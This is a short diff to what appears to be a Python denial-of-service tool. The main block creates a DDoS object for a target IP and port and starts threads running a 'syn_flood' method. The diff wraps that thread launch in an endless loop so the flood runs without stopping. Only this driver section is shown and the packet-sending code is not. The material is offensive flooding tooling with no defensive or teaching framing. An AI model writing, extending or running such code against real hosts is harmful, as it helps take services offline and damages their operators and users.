@@ -72,10 +72,11 @@ if __name__ == "__main__":
     start()
     pressure = DDoS(ip, port, pack)
     thread_list = []
-    for _ in range(threads):
-        t = threading.Thread(target=pressure.syn_flood)
-        t.start()
-        thread_list.append(t)
-     
-    for t in thread_list:
-        t.join()
+    while True:  
+        for _ in range(threads):
+            t = threading.Thread(target=pressure.syn_flood)
+            t.start()
+            thread_list.append(t)
+         
+        for t in thread_list:
+            t.join()
